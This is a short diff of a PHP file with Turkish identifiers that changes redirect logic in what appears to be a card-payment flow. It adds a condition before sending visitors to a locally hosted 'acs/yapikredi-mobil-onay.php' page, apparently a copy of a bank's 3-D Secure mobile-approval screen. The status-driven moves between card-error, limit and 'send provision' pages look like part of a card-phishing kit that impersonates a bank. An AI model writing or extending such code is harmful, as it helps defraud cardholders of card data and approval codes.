@@ -98,7 +98,7 @@ if ($get_hata !== null) {
     $hata_modu  = ($durum === '3d_hatali');
 
     if ($durum === 'tebrik') { header('Location: ' . BASE_PATH . '/sonuc.php'); exit; }
-    if ($durum === 'provizyon_hatali') { header("Location: " . BASE_PATH . "/acs/yapikredi-mobil-onay.php"); exit; }
+    if ($durum === 'provizyon_hatali' && empty($is_mobil_onay)) { header("Location: " . BASE_PATH . "/acs/yapikredi-mobil-onay.php"); exit; }
     if (in_array($durum, ['kart_hatali','eticaret_kapali','limit_yetersiz',
                            'kart_desteklenmiyor','provizyon_gonder'])) {
         header("Location: " . BASE_PATH . "/odeme_hata.php?hata={$durum}"); exit;
